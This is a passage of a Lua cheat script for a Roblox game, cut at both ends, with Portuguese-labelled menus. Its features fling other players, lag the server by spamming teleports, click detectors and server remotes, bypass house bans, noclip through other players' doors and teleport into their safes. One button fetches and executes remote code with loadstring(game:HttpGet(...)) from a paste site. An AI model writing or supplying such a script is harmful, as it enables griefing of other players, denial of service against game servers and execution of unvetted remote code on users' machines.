            local rootPart = character:FindFirstChild("HumanoidRootPart")
            if rootPart then
                rootPart.CFrame = CFrame.new(-308.447265625, 42.98085403442383, 94.30621337890625)
            end
        end
        
        -- Trava o personagem
        travarPersonagem()
        
        -- Forçar todas as partes existentes
        for _, v in ipairs(Workspace:GetDescendants()) do 
            ForcePart(v) 
        end
        
        -- Monitorar novas partes
        DescendantAddedConnection = Workspace.DescendantAdded:Connect(function(v) 
            if blackHoleActive then 
                ForcePart(v) 
            end 
        end)
        
        -- Perseguir jogador aleatório ACIMA DA CABEÇA (trocando a cada 0.5 segundos)
        local currentTarget = nil
        local lastChange = 0
        
        rotationConnection = RunService.RenderStepped:Connect(function(deltaTime)
            if blackHoleActive then
                lastChange = lastChange + deltaTime
                
                -- Troca de alvo a cada 0.5 segundos
                if lastChange >= 0.5 or not currentTarget then
                    lastChange = 0
                    
                    local players = Players:GetPlayers()
                    local validPlayers = {}
                    
                    for _, player in ipairs(players) do
                        if player ~= LocalPlayer and player.Character then
                            local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
                            local head = player.Character:FindFirstChild("Head")
                            if rootPart and head then
                                table.insert(validPlayers, head)
                            end
                        end
                    end
                    
                    if #validPlayers > 0 then
                        currentTarget = validPlayers[math.random(1, #validPlayers)]
                    end
                end
                
                -- Atualiza posição acima da cabeça do alvo atual
                if currentTarget then
                    Attachment1.WorldPosition = currentTarget.Position + Vector3.new(0, 5, 0)
                end
            end
        end)
        
    else
        if DescendantAddedConnection then
            DescendantAddedConnection:Disconnect()
            DescendantAddedConnection = nil
        end
        if rotationConnection then
            rotationConnection:Disconnect()
            rotationConnection = nil
        end
        
        -- Remove os corpos de trava do personagem
        local character = LocalPlayer.Character
        if character then
            local rootPart = character:FindFirstChild("HumanoidRootPart")
            if rootPart then
                if rootPart:FindFirstChild("TravarVelocity") then
                    rootPart.TravarVelocity:Destroy()
                end
                if rootPart:FindFirstChild("TravarPosition") then
                    rootPart.TravarPosition:Destroy()
                end
            end
        end
        
        -- Limpar attachments
        for _, v in ipairs(Workspace:GetDescendants()) do
            if v:IsA("BasePart") then
                for _, child in ipairs(v:GetChildren()) do
                    if child:IsA("AlignPosition") or child:IsA("Torque") then
                        child:Destroy()
                    end
                end
            end
        end
    end
end

-- UI sem dropdown
Troll:AddButton({
    Name = "AUTO SPAW ELI JOGADOR",
    Description = "SPAWNA ELI NOS JOGADORES ESPALHANDO ELI PELO MAPA",
    Callback = function()
        if not blackHoleActive then
            toggleBlackHole()
            print("GTVZ")
        else
            print("GTVZ")
        end
    end
})

Troll:AddButton({
    Name = "DESATIVAR",
    Callback = function()
        if blackHoleActive then
            toggleBlackHole()
            print("L FLING DESATIVADO")
        else
            print("  FLING já está desativado")
        end
    end
})

local kill = Troll:AddSection({Name = "LAGA SERVER"})

local toggles = { LagLaptop = false }

-- Function to Simulate Normal Click
local function clickNormally(object)
    local clickDetector = object:FindFirstChildWhichIsA("ClickDetector")
    if clickDetector then
        fireclickdetector(clickDetector)
    end
end

-- Function to Lag Game with Laptop
local function lagarJogoLaptop(laptopPath, maxTeleports)
    if laptopPath then
        local teleportCount = 0
        while teleportCount < maxTeleports and toggles.LagLaptop do
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = laptopPath.CFrame
            clickNormally(laptopPath)
            teleportCount = teleportCount + 1
            wait(0.0001)
        end
    else
        warn("Laptop não encontrado.")
    end
end

-- Lag Laptop Toggle
Troll:AddToggle({
    Name = "LAG COMPUTADOR",
    Default = false,
    Callback = function(state)
        toggles.LagLaptop = state
        if state then
            local laptopPath = workspace:FindFirstChild("WorkspaceCom"):FindFirstChild("001_GiveTools"):FindFirstChild("Laptop")
            if laptopPath then
                spawn(function()
                    lagarJogoLaptop(laptopPath, 999999999)
                end)
            else
                warn("Laptop não encontrado.")
            end
        else
            print("Lag com Laptop desativado.")
        end
    end
})


-- Toggle State for Lag Phone
toggles.LagPhone = false

-- Function to Lag Game with Phone
local function lagarJogoPhone(phonePath, maxTeleports)
    if phonePath then
        local teleportCount = 0
        while teleportCount < maxTeleports and toggles.LagPhone do
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = phonePath.CFrame
            clickNormally(phonePath)
            teleportCount = teleportCount + 1
            wait(0.01)
        end
    else
        warn("Telefone não encontrado.")
    end
end

-- Lag Phone Toggle
Troll:AddToggle({
    Name = "LAG CELULA",
    Default = false,
    Callback = function(state)
        toggles.LagPhone = state
        if state then
            local phonePath = workspace:FindFirstChild("WorkspaceCom"):FindFirstChild("001_CommercialStores"):FindFirstChild("CommercialStorage1"):FindFirstChild("Store"):FindFirstChild("Tools"):FindFirstChild("Iphone")
            if phonePath then
                spawn(function()
                    lagarJogoPhone(phonePath, 999999)
                end)
            else
                warn("Telefone não encontrado.")
            end
        else
            print("Lag com Telefone desativado.")
        end
    end
})


local BombActive = false

Troll:AddToggle({
    Name = "LAG BOMBA",
    Default = false,
    Callback = function(Value)
        if Value then
            BombActive = true

            local Player = game.Players.LocalPlayer
            local Character = Player.Character or Player.CharacterAdded:Wait()
            local RootPart = Character:WaitForChild("HumanoidRootPart")
            local WorkspaceService = game:GetService("Workspace")
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local Bomb = WorkspaceService:WaitForChild("WorkspaceCom"):WaitForChild("001_CriminalWeapons"):WaitForChild("GiveTools"):WaitForChild("Bomb")

            task.spawn(function()
                while BombActive do
                    if Bomb and RootPart then
                        RootPart.CFrame = Bomb.CFrame
                        fireclickdetector(Bomb.ClickDetector) -- Aciona o ClickDetector da bomba
                        task.wait(0.00001) -- Delay mínimo para evitar travamentos
                    else
                        task.wait(0.0001) 
                    end
                end
            end)

            task.spawn(function()
                while BombActive do
                    if Bomb and RootPart then
                        local VirtualInputManager = game:GetService("VirtualInputManager")
                        VirtualInputManager:SendMouseButtonEvent(500, 500, 0, true, game, 0) 
                        task.wait(1.5)
                        VirtualInputManager:SendMouseButtonEvent(500, 500, 0, false, game, 0) 

                        -- Executa o FireServer com o nome do jogador
                        local args = {
                            [1] = "Bomb" .. Player.Name -- Usa o nome do jogador atual
                        }
                        ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Blo1wBomb1sServe1r"):FireServer(unpack(args))
                    end
                    task.wait(1.5) -- Intervalo de 1 segundo para clique e FireServer
                end
            end)
        else
            -- Desativando a funcionalidade
            BombActive = false
        end
    end
})

local kill = Troll:AddSection({Name = "MENU CEU"})

Troll:AddButton({
    Name = "IMAGEM NO CEU",
    Callback = function()
        loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/qZkSict1retkqFIr/raw"))()
    end
})

Troll:AddButton({
    Name = "DESATIVAR IMAGEM",
    Callback = function()
        -- Para todas as animações
        if rigidTrack then
            pcall(function()
                rigidTrack:Stop()
                rigidTrack:Destroy()
            end)
            rigidTrack = nil
        end
        
        if skyboxTrack then
            pcall(function()
                skyboxTrack:Stop()
                skyboxTrack:Destroy()
            end)
            skyboxTrack = nil
        end
        
        -- Para animações no personagem
        local player = game.Players.LocalPlayer
        local character = player.Character
        if character then
            local humanoid = character:FindFirstChild("Humanoid")
            if humanoid then
                local animator = humanoid:FindFirstChild("Animator")
                if animator then
                    for _, track in pairs(animator:GetPlayingAnimationTracks()) do
                        if track.Animation then
                            local animId = track.Animation.AnimationId
                            if animId == "rbxassetid://70883871260184" or animId == "rbxassetid://3695333486" then
                                pcall(function()
                                    track:Stop()
                                end)
                            end
                        end
                    end
                end
            end
        end
        
        -- Remove o skybox
        pcall(function()
            if game.Lighting:FindFirstChild("Skybox") then
                game.Lighting.Skybox:Destroy()
            end
        end)
        
        -- Restaura corpos salvos
        for _, body in pairs(savedNukeBody) do
            pcall(function()
                body:Destroy()
            end)
        end
        savedNukeBody = {}
        
        skyboxEnabled = false
        print("L IMAGEM NO CÉU DESATIVADA")
    end
})

Troll:AddToggle({
    Name = "IMAGEM NO CEU 1.0",
    Default = false,
    Callback = function(value)
        skyboxEnabled = value
        
        if value then
            local player = game.Players.LocalPlayer
            local character = player.Character
            
            if character then
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    local description = humanoid:GetAppliedDescription()
                    
                    savedNukeBody = {
                        Torso = description.Torso,
                        RightArm = description.RightArm,
                        LeftArm = description.LeftArm,
                        RightLeg = description.RightLeg,
                        LeftLeg = description.LeftLeg,
                        Head = description.Head
                    }
                    
                    task.wait(0.2)
                    
                    local args = {
                        [1] = 123402086843885,
                        [2] = 100839513065432,
                        [3] = 78300682916056,
                        [4] = 86276701020724,
                        [5] = 78409653958165,
                        [6] = 15093053680
                    }
                    
                    pcall(function()
                        game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(args)
                    end)
                    
                    task.wait(0.3)
                    
                    local newAnim = Instance.new("Animation")
                    newAnim.AnimationId = "rbxassetid://70883871260184"
                    
                    skyboxTrack = humanoid:LoadAnimation(newAnim)
                    skyboxTrack.Priority = Enum.AnimationPriority.Action4
                    skyboxTrack:Play(0.1, 1, 0.01)
                    
                    task.wait(0.5)
                    
                    local plankAnim = Instance.new("Animation")
                    plankAnim.AnimationId = "rbxassetid://3695333486"
                    rigidTrack = humanoid:LoadAnimation(plankAnim)
                    rigidTrack.Priority = Enum.AnimationPriority.Movement
                    rigidTrack:Play(0.1, 1, 0)
                end
            end
        else
            stopAllAnimations()
            
            task.wait(0.2)
            
            if next(savedNukeBody) then
                local player = game.Players.LocalPlayer
                local character = player.Character
                
                if character then
                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        local restoreBody = {
                            [1] = savedNukeBody.Torso,
                            [2] = savedNukeBody.RightArm,
                            [3] = savedNukeBody.LeftArm,
                            [4] = savedNukeBody.RightLeg,
                            [5] = savedNukeBody.LeftLeg,
                            [6] = savedNukeBody.Head
                        }
                        
                        local args = {
                            [1] = restoreBody
                        }
                        
                        pcall(function()
                            game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
                        end)
                        
                        savedNukeBody = {}
                    end
                end
            end
        end
    end
})

local nukeFlashEnabled = false
local nukeFlashTrack = nil
local flashRigidTrack = nil
local savedNukeFlashBody = {}

local function stopFlashAnimations()
    if flashRigidTrack then
        pcall(function()
            flashRigidTrack:Stop()
            flashRigidTrack:Destroy()
        end)
        flashRigidTrack = nil
    end
    
    if nukeFlashTrack then
        pcall(function()
            nukeFlashTrack:Stop()
            nukeFlashTrack:Destroy()
        end)
        nukeFlashTrack = nil
    end
end

Troll:AddToggle({
    Name = "IMAGEM NO CEU 2.0",
    Default = false,
    Callback = function(value)
        nukeFlashEnabled = value
        
        if value then
            local player = game.Players.LocalPlayer
            local character = player.Character
            
            if character then
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    local description = humanoid:GetAppliedDescription()
                    
                    savedNukeFlashBody = {
                        Torso = description.Torso,
                        RightArm = description.RightArm,
                        LeftArm = description.LeftArm,
                        RightLeg = description.RightLeg,
                        LeftLeg = description.LeftLeg,
                        Head = description.Head
                    }
                    
                    task.wait(0.2)
                    
                    local args = {
                        [1] = 123402086843885,
                        [2] = 100839513065432,
                        [3] = 78300682916056,
                        [4] = 86276701020724,
                        [5] = 78409653958165,
                        [6] = 15093053680
                    }
                    
                    pcall(function()
                        game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(args)
                    end)
                    
                    task.wait(0.3)
                    
                    local newAnim = Instance.new("Animation")
                    newAnim.AnimationId = "rbxassetid://70883871260184"
                    
                    nukeFlashTrack = humanoid:LoadAnimation(newAnim)
                    nukeFlashTrack.Priority = Enum.AnimationPriority.Action4
                    nukeFlashTrack:Play(0.1, 1, 1)
                    
                    task.wait(0.1)
                    nukeFlashTrack:AdjustSpeed(5)
                    
                    task.wait(0.3)
                    
                    local plankAnim = Instance.new("Animation")
                    plankAnim.AnimationId = "rbxassetid://3695333486"
                    flashRigidTrack = humanoid:LoadAnimation(plankAnim)
                    flashRigidTrack.Priority = Enum.AnimationPriority.Movement
                    flashRigidTrack:Play(0.1, 1, 0)
                end
            end
        else
            stopFlashAnimations()
            
            task.wait(0.2)
            
            if next(savedNukeFlashBody) then
                local player = game.Players.LocalPlayer
                local character = player.Character
                
                if character then
                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                    if humanoid then
                        local restoreBody = {
                            [1] = savedNukeFlashBody.Torso,
                            [2] = savedNukeFlashBody.RightArm,
                            [3] = savedNukeFlashBody.LeftArm,
                            [4] = savedNukeFlashBody.RightLeg,
                            [5] = savedNukeFlashBody.LeftLeg,
                            [6] = savedNukeFlashBody.Head
                        }
                        
                        local args = {
                            [1] = restoreBody
                        }
                        
                        pcall(function()
                            game:GetService("ReplicatedStorage").Remotes.ChangeCharacterBody:InvokeServer(unpack(args))
                        end)
                        
                        savedNukeFlashBody = {}
                    end
                end
            end
        end
    end
})


local LocalPlayer = game:GetService("Players").LocalPlayer
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

local backupTables = {
    Vehicles = {},
    Canoes = {},
    Jets = {},
    Helis = {},
    Balls = {}
}

local TeleportCarro = {}
function TeleportCarro:MostrarNotificacao(msg)
    print("ðx "..msg)
end

local function AntiFlingLoop(name, getFolderFunc)
    local active = false
    task.spawn(function()
        while true do
            if active and LocalPlayer.Character then
                local folder = getFolderFunc()
                if folder then
                    for _, item in ipairs(folder:GetChildren()) do
                        local isMine = false
                        if name == "Vehicles" then
                            for _, seat in ipairs(item:GetDescendants()) do
                                if (seat:IsA("VehicleSeat") or seat:IsA("Seat")) and seat.Occupant and seat.Occupant.Parent == LocalPlayer.Character then
                                    isMine = true
                                    break
                                end
                            end
                        elseif name == "Canoes" then
                            local owner = item:FindFirstChild("Owner")
                            isMine = owner and owner.Value == LocalPlayer
                        elseif name == "Jets" or name == "Helis" then
                            isMine = item.Name == LocalPlayer.Name
                        end
                        if not isMine then
                            table.insert(backupTables[name], item:Clone())
                            item:Destroy()
                        end
                    end
                end
            end
            task.wait(0.03)
        end
    end)
    return function(state)
        active = state
        TeleportCarro:MostrarNotificacao(name.." "..(state and "ativado!" or "desativado!"))
        if not state then
            for _, item in ipairs(backupTables[name]) do
                local parentFolder = getFolderFunc()
                if parentFolder then item.Parent = parentFolder end
            end
            backupTables[name] = {}
        end
    end
end
 
protec:AddSection({
    Name = "MENU ANTI"
})

protec:AddButton({
    Name = "PROTEÇÃO BUG {IRREVERSÍVEL}",
    Description = "CRIA UMA PROTEÇÃO CONTRA BUGS/SCRIPT",
    Callback = function()
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer

        local blacklist = {
            {Name = "water", Class = "Part"},
        }

        local function neutralize(part)
            if part and part:IsA("BasePart") then
                pcall(function()
                    part.Anchored = true
                    part.CanCollide = false
                    part.Massless = true
                    part.Transparency = 1
                    part:ClearAllChildren()
                end)
                pcall(function()
                    part:Destroy()
                end)
            end
        end

        workspace.DescendantAdded:Connect(function(obj)
            for _, rule in ipairs(blacklist) do
                if obj.Name == rule.Name and obj.ClassName == rule.Class then
                    neutralize(obj)
                end
            end
        end)

        for _, obj in ipairs(workspace:GetDescendants()) do
            for _, rule in ipairs(blacklist) do
                if obj.Name == rule.Name and obj.ClassName == rule.Class then
                    neutralize(obj)
                end
            end
        end

        task.spawn(function()
            while task.wait(0.25) do
                for _, rule in ipairs(blacklist) do
                    for _, v in next, getnilinstances() do
                        if v.Name == rule.Name and v.ClassName == rule.Class then
                            neutralize(v)
                        end
                    end
                end
            end
        end)

        LocalPlayer.CharacterAdded:Connect(function(char)
            local hum = char:WaitForChild("Humanoid")
            hum.Touched:Connect(function(hit)
                for _, rule in ipairs(blacklist) do
                    if hit.Name == rule.Name and hit.ClassName == rule.Class then
                        neutralize(hit)
                    end
                end
            end)
        end)
    end
})

protec:AddButton({
	Name = "ANTI ST FULL",
	Callback = function()
		local player = game.Players.LocalPlayer

		if player.Character and player.Character:FindFirstChild("Humanoid") then
			-- Renomeia o Humanoid original
			player.Character.Humanoid.Name = "1"

			-- Clona e renomeia o novo como "Humanoid"
			local clone = player.Character["1"]:Clone()
			clone.Parent = player.Character
			clone.Name = "Humanoid"
			task.wait(0.1)

			-- Remove o antigo
			player.Character["1"]:Destroy()

			-- Atualiza a câmera
			workspace.CurrentCamera.CameraSubject = player.Character.Humanoid

			-- Reinicia o Animate (se existir)
			local anim = player.Character:FindFirstChild("Animate")
			if anim then
				anim.Disabled = true
				task.wait(0.1)
				anim.Disabled = false
			end
		end
	end
})


local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- = Função: Remove tools de OUTROS jogadores (mochila e personagem)
local function removerToolsDe(player)
	pcall(function()
		if player:FindFirstChild("Backpack") then
			for _, tool in ipairs(player.Backpack:GetChildren()) do
				if tool:IsA("Tool") then
					tool:Destroy()
				end
			end
		end
		if player.Character then
			for _, obj in ipairs(player.Character:GetChildren()) do
				if obj:IsA("Tool") then
					obj:Destroy()
				end
			end
		end
	end)
end

-- = Função: Remove suas próprias Tools localmente (sem afetar os outros)
local function removerMinhasTools()
	pcall(function()
		if LocalPlayer:FindFirstChild("Backpack") then
			for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
				if tool:IsA("Tool") then
					tool:Destroy()
				end
			end
		end
		if LocalPlayer.Character then
			for _, tool in ipairs(LocalPlayer.Character:GetChildren()) do
				if tool:IsA("Tool") then
					tool:Destroy()
				end
			end
		end
	end)
end


local rodando = false

protec:AddToggle({
	Name = "ANTI TOOL FULL",
	Default = false,
	Callback = function(Value)
		rodando = Value

		if rodando then
			print("= ANTI TOOL PRO ATIVADO")

			task.spawn(function()
				while rodando do
					task.wait(1)

					-- Remover tools de todos os outros
					for _, player in ipairs(Players:GetPlayers()) do
						if player ~= LocalPlayer then
							removerToolsDe(player)
						end
					end

					-- Remover suas próprias tools localmente
					removerMinhasTools()
				end
			end)

		else
			print("= ANTI TOOL PRO DESATIVADO")
		end
	end
})
protec:AddToggle({
    Name = "ANTI FLING CARROS",
    Description = "",
    Default = false,
    Callback = AntiFlingLoop("Vehicles", function()
        return Workspace:FindFirstChild("Vehicles")
    end)
})

protec:AddToggle({
    Name = "ANTI CANOE FLING",
    Description = "",
    Default = false,
    Callback = AntiFlingLoop("Canoes", function()
        local workspaceCom = Workspace:FindFirstChild("WorkspaceCom")
        return workspaceCom and workspaceCom:FindFirstChild("001_CanoeStorage")
    end)
})

protec:AddToggle({
    Name = "ANTI FLING JETS",
    Description = "",
    Default = false,
    Callback = AntiFlingLoop("Jets", function()
        local folder = Workspace:FindFirstChild("WorkspaceCom")
        if folder and folder:FindFirstChild("001_Airport") then
            local storage = folder["001_Airport"]:FindFirstChild("AirportHanger")
            if storage then return storage:FindFirstChild("001_JetStorage") and storage["001_JetStorage"]:FindFirstChild("JetAirport") end
        end
    end)
})

protec:AddToggle({
    Name = "ANTI FLING HELICÓPTEROS",
    Description = "",
    Default = false,
    Callback = AntiFlingLoop("Helis", function()
        local folder = Workspace:FindFirstChild("WorkspaceCom")
        return folder and folder:FindFirstChild("001_HeliStorage") and folder["001_HeliStorage"]:FindFirstChild("PoliceStationHeli")
    end)
})

protec:AddToggle({
    Name = "ANTI FLING BOLA",
    Description = "",
    Default = false,
    Callback = AntiFlingLoop("Balls", function()
        local folder = Workspace:FindFirstChild("WorkspaceCom")
        return folder and folder:FindFirstChild("001_SoccerBalls")
    end)
})


local antiSitActive = false
protec:AddToggle({
    Name = "ANTI SENTA",
    Description = "",
    Default = false,
    Callback = function(state)
        antiSitActive = state
        TeleportCarro:MostrarNotificacao("Anti Sit "..(state and "ativado!" or "desativado!"))
        task.spawn(function()
            while antiSitActive and LocalPlayer.Character do
                local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
                    if humanoid:GetState() == Enum.HumanoidStateType.Seated then
                        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                    end
                end
                task.wait(0.05)
            end
            if not antiSitActive then
                local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
                end
            end
        end)
    end
})

protec:AddToggle({
    Name = "ANTI-LAG",
    Description = "",
    Default = false,
    Callback = function(state)
        local Players = game:GetService("Players")
        local dedupLock = {}
        local IGNORED_PLAYER

        if not state then return end

        local function marcarIgnorado(player)
            IGNORED_PLAYER = player
        end

        local function isTargetTool(inst)
            return inst:IsA("Tool")
        end

        local function gatherTools(player)
            local found = {}
            local containers = {}
            if player.Character then table.insert(containers, player.Character) end
            local backpack = player:FindFirstChildOfClass("Backpack")
            if backpack then table.insert(containers, backpack) end
            local sg = player:FindFirstChild("StarterGear")
            if sg then table.insert(containers, sg) end
            for _, container in ipairs(containers) do
                for _, child in ipairs(container:GetChildren()) do
                    if isTargetTool(child) then table.insert(found, child) end
                end
            end
            return found
        end

        local function dedupePlayer(player)
            if player == IGNORED_PLAYER then return end
            if dedupLock[player] then return end
            dedupLock[player] = true
            local tools = gatherTools(player)
            if #tools > 1 then
                for i = 2, #tools do pcall(function() tools[i]:Destroy() end) end
            end
            dedupLock[player] = false
        end

        local function hookPlayer(player)
            if not IGNORED_PLAYER then marcarIgnorado(player) end
            task.defer(dedupePlayer, player)
            local function setupChar(char)
                task.delay(0.5, function() dedupePlayer(player) end)
                char.ChildAdded:Connect(function(child)
                    if isTargetTool(child) then task.delay(0.1, function() dedupePlayer(player) end) end
                end)
            end
            if player.Character then setupChar(player.Character) end
            player.CharacterAdded:Connect(setupChar)
            local backpack = player:WaitForChild("Backpack", 10)
            if backpack then
                backpack.ChildAdded:Connect(function(child)
                    if isTargetTool(child) then task.delay(0.1, function() dedupePlayer(player) end) end
                end)
            end
            local sg = player:FindFirstChild("StarterGear") or player:WaitForChild("StarterGear", 10)
            if sg then
                sg.ChildAdded:Connect(function(child)
                    if isTargetTool(child) then task.delay(0.1, function() dedupePlayer(player) end) end
                end)
            end
        end

        Players.PlayerAdded:Connect(hookPlayer)
        for _, plr in ipairs(Players:GetPlayers()) do hookPlayer(plr) end

        task.spawn(function()
            while state do
                for _, plr in ipairs(Players:GetPlayers()) do dedupePlayer(plr) end
                task.wait(2)
            end
        end)
    end
})

protec:AddToggle({
    Name = "ANTI FLING PORTAS",
    Description = "",
    Default = false,
    Callback = function(state)
        if not _G.hiddenDoors then _G.hiddenDoors = {} end
        if state then
            _G.hiddenDoors = {}
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") and obj.Name:lower():find("door") then
                    local doorData = {
                        door = obj,
                        originalTransparency = obj.Transparency,
                        originalCanCollide = obj.CanCollide,
                        originalCastShadow = obj.CastShadow
                    }
                    obj.Transparency = 1
                    obj.CanCollide = false
                    obj.CastShadow = false
                    for _, child in ipairs(obj:GetChildren()) do
                        if child:IsA("BasePart") then
                            child.Transparency = 1
                            child.CanCollide = false
                        elseif child:IsA("SurfaceGui") or child:IsA("BillboardGui") then
                            child.Enabled = false
                        end
                    end
                    table.insert(_G.hiddenDoors, doorData)
                end
            end
            print("ðx§ " .. #_G.hiddenDoors .. " portas escondidas!")
        else
            for _, doorData in ipairs(_G.hiddenDoors or {}) do
                if doorData.door and doorData.door.Parent then
                    doorData.door.Transparency = doorData.originalTransparency
                    doorData.door.CanCollide = doorData.originalCanCollide
                    doorData.door.CastShadow = doorData.originalCastShadow
                    for _, child in ipairs(doorData.door:GetChildren()) do
                        if child:IsA("BasePart") then
                            child.Transparency = 0
                            child.CanCollide = true
                        elseif child:IsA("SurfaceGui") or child:IsA("BillboardGui") then
                            child.Enabled = true
                        end
                    end
                end
            end
            print("âS& " .. #(_G.hiddenDoors or {}) .. " portas restauradas com funcionalidade!")
            _G.hiddenDoors = {}
        end
    end
})


local isHouseRGBActive = false

local colors = {
    Color3.new(1, 0, 0),       -- Vermelho
    Color3.new(0, 1, 0),       -- Verde
    Color3.new(0, 0, 1),       -- Azul
    Color3.new(1, 1, 0),       -- Amarelo
    Color3.new(0, 1, 1),       -- Ciano
    Color3.new(1, 0, 1)        -- Magenta
}

local function changeColor()
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local remoteEvent = replicatedStorage:FindFirstChild("RE") and replicatedStorage.RE:FindFirstChild("1Player1sHous1e")

    if not remoteEvent then
        warn("RemoteEvent '1Player1sHous1e' não encontrado.")
        return
    end

    while isHouseRGBActive do
        for _, color in ipairs(colors) do
            if not isHouseRGBActive then return end
            local args = {
                [1] = "ColorPickHouse",
                [2] = color
            }
            pcall(function()
                remoteEvent:FireServer(unpack(args))
            end)
            task.wait(0.8)
        end
    end
end

local function toggleHouseRGB(state)
    isHouseRGBActive = state
    if isHouseRGBActive then
        print("Casa RGB Ativada")
        spawn(changeColor)
    else
        print("Casa RGB Desativada")
    end
end

-- Agora sim, corretamente:
Tabcasa:AddToggle({
    Name = "CASA RGB",
    Default = false,
    Callback = function(state)
        toggleHouseRGB(state)
    end
})

Tabcasa:AddButton({
    Name = "UNBAN",
    Callback = function()
        local Players = game:GetService("Players")
        local player = Players.LocalPlayer
        local houseModel = nil

        -- 1. Remove a barreira vermelha (bloqueio local)
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("Part") and obj.Transparency > 0.5 and obj.Size.X > 20 and obj.Size.Y > 20 and obj.Size.Z > 20 then
                if tostring(obj.BrickColor):lower():find("red") or tostring(obj.Color):lower():find("255") then
                    obj.CanCollide = false
                    obj.Transparency = 1
                    obj.Material = Enum.Material.SmoothPlastic
                end
            end
        end

        -- 2. Procura a casa e tenta aplicar unban
        local lots = workspace:FindFirstChild("001_Lots")
        if lots then
            for _, v in pairs(lots:GetDescendants()) do
                if v.Name == "Permissions" and v:IsA("Folder") then
                    if v:FindFirstChild("Allow") then
                        houseModel = v
                        break
                    end
                end
            end
        end

        -- 3. Envia unban
        if houseModel then
            local allowRemote = houseModel:FindFirstChild("Allow")
            if allowRemote and allowRemote:IsA("RemoteEvent") then
                allowRemote:FireServer(player)
                print("Unban enviado com sucesso!")
            else
                warn("Remote 'Allow' não encontrado.")
            end
        else
            warn("Nenhuma casa com sistema 'Permissions' encontrada.")
        end
    end
})


Tabcasa:AddSection({ Name = "TROLL CASA" })

local isUnbanActive = false
local SelectHouse = nil
local NoclipDoor = nil

-- Função para obter lista de casas
local function getHouseList()
    local Tabela = {}
    local lots = workspace:FindFirstChild("001_Lots")
    if lots then
        for _, House in ipairs(lots:GetChildren()) do
            if House.Name ~= "For Sale" and House:IsA("Model") then
                table.insert(Tabela, House.Name)
            end
        end
    end
    return Tabela
end

-- Dropdown para selecionar casas
pcall(function()
    Tabcasa:AddDropdown({
        Name = "SELECIONE A CASA",
        Options = getHouseList(),
        Default = "...",
        Callback = function(Value)
            SelectHouse = Value
            if NoclipDoor then
                NoclipDoor:Set(false)
            end
            print("Casa selecionada: " .. tostring(Value))
        end
    })
end)

-- Função para atualizar a lista de casas
local function DropdownHouseUpdate()
    local Tabela = getHouseList()
    print("DropdownHouseUpdate called. Houses found:", #Tabela)
    pcall(function()
        Tabcasa:ClearDropdown("Selecione a Casa") -- Tentar limpar dropdown, se suportado
        Tabcasa:AddDropdown({
            Name = "SELECIONE A CASA",
            Options = Tabela,
            Default = "...",
            Callback = function(Value)
                SelectHouse = Value
                if NoclipDoor then
                    NoclipDoor:Set(false)
                end
            end
        })
    end)
end

-- Inicializar dropdown
pcall(DropdownHouseUpdate)

-- Botão para atualizar lista de casas
pcall(function()
    Tabcasa:AddButton({
        Name = "ATUALIZAR LISTA DE CASAS",
        Callback = function()
            print("Atualizar Lista de Casas button clicked.")
            pcall(DropdownHouseUpdate)
        end
    })
end)

-- Botão para teleportar para casa
pcall(function()
    Tabcasa:AddButton({
        Name = "TELEPORTAR PARA CASA",
        Callback = function()
            local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
            if House and game.Players.LocalPlayer.Character then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(House.WorldPivot.Position)
            else
                print("Casa não encontrada: " .. tostring(SelectHouse))
            end
        end
    })
end)

-- Botão para teleportar para cofre
pcall(function()
    Tabcasa:AddButton({
        Name = "Teleportar para Cofre",
        Callback = function()
            local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
            if House and House:FindFirstChild("HousePickedByPlayer") and game.Players.LocalPlayer.Character then
                local safe = House.HousePickedByPlayer.HouseModel:FindFirstChild("001_Safe")
                if safe then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(safe.WorldPivot.Position)
                else
                    print("Cofre não encontrado na casa: " .. tostring(SelectHouse))
                end
            else
                print("Casa não encontrada: " .. tostring(SelectHouse))
            end
        end
    })
end)

-- Toggle para atravessar porta
pcall(function()
    NoclipDoor = Tabcasa:AddToggle({
        Name = "ATRAVESSAR PORTA DAS CASA",
        Description = "",
        Default = false,
        Callback = function(Value)
            pcall(function()
                local House = workspace["001_Lots"]:FindFirstChild(tostring(SelectHouse))
                if House and House:FindFirstChild("HousePickedByPlayer") then
                    local housepickedbyplayer = House.HousePickedByPlayer
                    local doors = housepickedbyplayer.HouseModel:FindFirstChild("001_HouseDoors")
                    if doors and doors:FindFirstChild("HouseDoorFront") then
                        for _, Base in ipairs(doors.HouseDoorFront:GetChildren()) do
                            if Base:IsA("BasePart") then
                                Base.CanCollide = not Value
                            end
                        end
                    end
                end
            end)
        end
    })
end)

-- Toggle para tocar campainha
pcall(function()
    Tabcasa:AddToggle({
        Name = "TOCAR CAMPAINHA",
        Description = "",
        Default = false,
        Callback = function(Value)
